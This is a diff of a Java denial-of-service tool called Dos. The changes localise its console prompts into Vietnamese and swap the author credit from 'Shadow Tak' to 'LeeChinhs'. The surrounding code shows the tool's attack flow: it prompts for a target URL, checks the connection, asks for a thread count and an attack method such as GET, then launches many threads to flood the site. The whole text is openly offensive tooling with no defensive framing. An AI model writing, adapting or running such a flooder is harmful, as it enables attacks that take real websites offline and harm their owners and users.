@@ -52,23 +52,23 @@ public class Dos implements Runnable {
         int attakingAmoun = 0;
         Dos dos = new Dos(0, 0);
         Scanner in = new Scanner(System.in);
-        System.out.print("Enter Url: ");
+        System.out.print("nhập địa chỉ web: ");
         url = in.nextLine();
         System.out.println("\n");
-        System.out.println("Starting Attack to url: " + url);
+        System.out.println("tấn công url: " + url);
 
         String[] SUrl = url.split("://");
 
-        System.out.println("Checking connection to Site");
+        System.out.println("kiểm tra kết nối với Site");
         if (SUrl[0] == "http" || SUrl[0].equals("http")) {
             dos.checkConnection(url);
         } else {
             dos.sslCheckConnection(url);
         }
 
-        System.out.println("Setting DDoS By: Shadow Tak");
+        System.out.println("Chỉnh sửa By: LeeChinhs");
 
-        System.out.print("Thread: ");
+        System.out.print("số lần tấn công: ");
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
@@ -77,7 +77,7 @@ public class Dos implements Runnable {
             Dos.amount = Integer.parseInt(amount);
         }
 
-        System.out.print("method: ");
+        System.out.print("dạng tấn công (cfb): ");
         String option = in.nextLine();
         int ioption = 1;
         if (option == "get" || option == "GET") {
@@ -97,7 +97,7 @@ public class Dos implements Runnable {
         Thread.sleep(2000);
 
 
-        System.out.println("Starting Attack");
+        System.out.println("Bắt đầu tấn công ");
         ArrayList<Thread> threads = new ArrayList<Thread>();
         for (int i = 0; i < Dos.amount; i++) {
             Thread t = new Thread(new Dos(i, ioption));
